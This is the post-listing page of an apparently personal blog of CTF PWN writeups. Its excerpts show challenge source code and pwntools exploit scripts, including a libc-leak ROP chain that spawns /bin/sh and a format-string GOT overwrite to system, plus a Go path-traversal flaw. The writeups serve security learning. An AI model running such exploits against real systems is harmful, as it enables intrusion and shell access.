<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Posts | Wgg's Blog Site</title>
<meta name=keywords content><meta name=description content="Posts - Wgg's Blog Site"><meta name=author content="Me"><link rel=canonical href=https://wgggggggg.github.io/posts/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://wgggggggg.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://wgggggggg.github.io/posts/index.xml><link rel=alternate hreflang=en href=https://wgggggggg.github.io/posts/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://wgggggggg.github.io/posts/"><meta property="og:site_name" content="Wgg's Blog Site"><meta property="og:title" content="Posts"><meta property="og:description" content="ExampleSite description"><meta property="og:locale" content="en"><meta property="og:type" content="website"><meta property="og:image" content="https://wgggggggg.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://wgggggggg.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Posts"><meta name=twitter:description content="ExampleSite description"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://wgggggggg.github.io/posts/"}]}</script></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://wgggggggg.github.io/ accesskey=h title="Wgg (Alt + H)"><img src=https://wgggggggg.github.io/apple-touch-icon.png alt aria-label=logo height=35>Wgg</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://wgggggggg.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://wgggggggg.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://example.org title=example.org><span>example.org</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><header class=page-header><div class=breadcrumbs><a href=https://wgggggggg.github.io/>Home</a></div><h1>Posts
<a href=/posts/index.xml title=RSS aria-label=RSS><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" height="23"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></h1></header><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>secconCTF2025 PWN Writeup'</h2></header><div class=entry-content><p>secconCTF 2025 PWN Writeup unserialize 题目源码
#include &lt;ctype.h> #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> ssize_t unserialize(FILE *fp, char *buf, size_t size) { char szbuf[0x20]; char *tmpbuf; for (size_t i = 0; i &lt; sizeof(szbuf); i++) { szbuf[i] = fgetc(fp); if (szbuf[i] == ':') { szbuf[i] = 0; break; } if (!isdigit(szbuf[i]) || i == sizeof(szbuf) - 1) { return -1; } } if (atoi(szbuf) > size) { return -1; } tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0)); size_t sz = strtoul(szbuf, NULL, 10); for (size_t i = 0; i &lt; sz; i++) { if (fscanf(fp, "%02hhx", tmpbuf + i) != 1) { return -1; } } memcpy(buf, tmpbuf, sz); return sz; } int main() { char buf[0x100]; setbuf(stdin, NULL); setbuf(stdout, NULL); if (unserialize(stdin, buf, sizeof(buf)) &lt; 0) { puts("[-] Deserialization faield"); } else { puts("[+] Deserialization success"); } return 0; } 题目保护
[*] '/mnt/hgfs/Ubuntu_Shared_Dir/secconCTF2025/unserialize/unserialize/chall' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) SHSTK: Enabled IBT: Enabled Stripped: No 漏洞点在
...</p></div><footer class=entry-footer><span title='2025-12-15 23:00:24 +0800 CST'>December 15, 2025</span>&nbsp;·&nbsp;18 min&nbsp;·&nbsp;3629 words&nbsp;·&nbsp;Me</footer><a class=entry-link aria-label="post link to secconCTF2025 PWN Writeup'" href=https://wgggggggg.github.io/posts/ctf/secconctf2025-writeup/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>backdoorCTF2025 PWN Writeup</h2></header><div class=entry-content><p>backdoorCTF 2025 PWN Writeup Devil’s Convergence 很简单的一道题，将输入的8个字节跟libc地址异或，然后输出，所以我们可以得到libc地址
还存在栈溢出漏洞，直接写ROP拿shell即可
exp
#!/usr/bin/env python3 from pwn import * from pwncli import * context(os='linux',arch = 'amd64') #context.terminal = ['tmux', 'new-window', '-n', 'debug' ] filename = "chal_chainsawman" + "_patched" libcname = "/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6" host = "remote.infoseciitr.in" port = 8005 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) gs = ''' set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39 ''' def sa(a,b): sh.sendafter(a, b) def sla(a, b): sh.sendlineafter(a, b) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) def cyclic_xor(data: bytes, key: bytes) -> bytes: """ 对一个字节串（data）与一个 8 字节的密钥（key）进行循环异或（XOR）操作。 Args: data: 需要进行异或操作的输入字节串。 key: 8 字节的密钥。 Returns: 异或操作后的结果字节串。 Raises: ValueError: 如果密钥长度不是 8 字节，则抛出异常。 """ # 检查密钥长度是否为 8 字节 if len(key) != 8: raise ValueError("密钥 (key) 必须是 8 字节长。") # 用于存储结果的字节列表 result_list = [] # 获取数据和密钥的长度 data_len = len(data) key_len = len(key) # key_len 此时应为 8 # 遍历数据中的每个字节 for i in range(data_len): # 确定当前字节 i 对应的密钥字节的索引 j # j = i % key_len 会让 j 在 0 到 7 之间循环 j = i % key_len # 对数据字节和密钥字节进行 XOR 运算 # data[i] 和 key[j] 都是整数（0-255）表示的字节值 xor_byte = data[i] ^ key[j] # 将 XOR 结果添加到结果列表中 result_list.append(xor_byte) # 将整数列表转换回字节串并返回 return bytes(result_list) sh = start() # 自定义 dest 内容 sa("Submit to her control: ", b'\x00' * 4) sh.recvuntil(b"essence: ") low4 = sh.recv(4) sa("to War: ", b'\x00' * 4) sh.recvuntil(b"essence: ") high4 = sh.recv(4) system_addr = u64(low4 + high4) log.success("system: " + hex(system_addr)) libc_base = system_addr - libc.sym['system'] rdi_ret = 0x000000000010f78b + libc_base binsh_addr = libc_base + next(libc.search("/bin/sh")) payload = b'A' * 80 + b'B' * 8 + p64(rdi_ret + 1) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) sa("contract: ", cyclic_xor(payload, p64(system_addr))) sh.interactive() Gamble 存在可多次触发的格式化字符串漏洞，printf里只能写6个字节，但是可以通过前面的10个字节放地址，printf里放%9$hhn来往任意地址写入b'\x00。因为可以多次触发，所以也可以泄露出libc地址，栈地址，程序基地址等。
...</p></div><footer class=entry-footer><span title='2025-12-08 23:30:24 +0800 CST'>December 8, 2025</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;2068 words&nbsp;·&nbsp;Me</footer><a class=entry-link aria-label="post link to backdoorCTF2025 PWN Writeup" href=https://wgggggggg.github.io/posts/ctf/backdoorctf2025-writeup/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>HeroCTF2025 PWN Writeup</h2></header><div class=entry-content><p>paf_traversal 漏洞点 func HandleDownloadWordlist(c *gin.Context) { wordlistDir := getWordlistDir() json := DownloadRequest{} if err := c.ShouldBindJSON(&amp;json); err != nil { c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()}) return } fileName := path.Base(json.Filename) // LINE 46: Sanitized but UNUSED! filePath := filepath.Join(wordlistDir, json.Filename) // LINE 47: Uses unsanitized input! f, err := os.Open(filePath) // LINE 49: Opens the unsanitized path if err != nil { c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}) return } defer f.Close() data, err := io.ReadAll(f) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}) return } c.JSON(http.StatusOK, gin.H{ "filename": fileName, // Returns sanitized name "content": string(data), // But returns content from unsanitized path! }) } Key Issue: Line 46 calls path.Base(json.Filename) to sanitize the filename, but this result is stored in fileName and only used for the response. Line 47 uses the original unsanitized json.Filename to construct the file path, allowing path traversal!
...</p></div><footer class=entry-footer><span title='2025-12-01 23:30:00 +0800 CST'>December 1, 2025</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2503 words&nbsp;·&nbsp;Me</footer><a class=entry-link aria-label="post link to HeroCTF2025 PWN Writeup" href=https://wgggggggg.github.io/posts/ctf/heroctf2025-writeup/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>sknbCTF2025 PWN Writeup</h2></header><div class=entry-content><p>sknbCTF 2025 PWN Writeup sirokemo-says-dist 赤裸裸的格式化字符串漏洞
没开PIE，是Partial RELRO，可以写GOT表。
那么思路就很明确了，第一次格式化字符串先改exit的GOT表为main函数地址，这样可以无限触发格式化字符串漏洞
之后再将printf的GOT表改为system函数地址
在下一次输入的时候输入/bin/sh即可
#!/usr/bin/env python3 from pwn import * from pwncli import * context(os='linux',arch = 'amd64') #context.terminal = ['tmux', 'new-window', '-n', 'debug' ] filename = "chall" + "_patched" libcname = "/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6" host = "34.104.150.35" port = 9000 elf = context.binary = ELF(filename) if libcname: libc = ELF(libcname) gs = ''' b main set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39 ''' def sa(a,b): sh.sendafter(a, b) def sla(a, b): sh.sendlineafter(a, b) def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path) sh = start() exit_addr = 0x404020 printf_addr = 0x404000 # Your exploit here #0x11 0x40 0x66 payload = b"%17c%15$hhn%47c%16$hhn%38c%14$hhn%41$p%40$p".ljust(0x40, b'A') + p64(exit_addr) + p64(exit_addr + 1) + p64(exit_addr + 2) sa("(^・ω・^§)ﾉ ", payload) sh.recv(0x66) libc_base = int(sh.recv(14), base = 16) - 0x2a1ca stack = int(sh.recv(14), base = 16) log.success("libc_base: " + hex(libc_base)) log.success("stack: " + hex(stack)) #target_addr = stack - 0x118 system = libc.sym['system'] + libc_base payload = payload = fmtstr_payload( 6, {printf_addr: system}, write_size='short' # 'byte' / 'short' / 'int'，内部自动分片 ) print(payload) sa("(^・ω・^§)ﾉ ", payload) sh.interactive() kufvm-dist 虚拟机
...</p></div><footer class=entry-footer><span title='2025-11-27 03:30:24 +0800 CST'>November 27, 2025</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1423 words&nbsp;·&nbsp;Me</footer><a class=entry-link aria-label="post link to sknbCTF2025 PWN Writeup" href=https://wgggggggg.github.io/posts/ctf/sknbctf2025-writeup/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>PCTF2025 PWN Writeup</h2></header><div class=entry-content><p>cursed_format #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;string.h> #define fmtsize 0x20 __attribute__((constructor)) void ignore_me(){ setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); } void banner(){ puts("=+=+=+=+=+=+=+=+=+=+=+=+=+=+="); puts("For all my format string haters."); puts("(No one likes %n)"); puts("=+=+=+=+=+=+=+=+=+=+=+=+=+=+="); } void printchoices(){ puts("1. Keep formatting"); puts("2. Just leave"); printf(">> "); } void getStr(char * str){ memset(str, 0, fmtsize); read(0, str, fmtsize); } void curse(char * str, char * key){ for(int i=0; i&lt;fmtsize; i++){ char c = str[i]; str[i] = c ^ key[i]; } for(int i=0; i&lt;fmtsize; i++){ key[i] = str[i]; } } int main(){ char str[fmtsize]; char key[fmtsize]; int option; banner(); memset(key, 0xff, fmtsize); while(1){ printchoices(); getStr(str); option = atoi(str); switch(option){ case 1: getStr(str); curse(str,key); printf(str); break; case 2: puts("Hope you did something cool..."); return 0; default: puts("Invalid option!"); break; } } } 显然漏洞点存在于case 1的printf(str)，有格式化字符串漏洞
...</p></div><footer class=entry-footer><span title='2025-11-27 02:40:24 +0800 CST'>November 27, 2025</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1063 words&nbsp;·&nbsp;Me</footer><a class=entry-link aria-label="post link to PCTF2025 PWN Writeup" href=https://wgggggggg.github.io/posts/ctf/pctf2025-writeup/></a></article></main><footer class=footer><span>&copy; 2025 <a href=https://wgggggggg.github.io/>Wgg's Blog Site</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>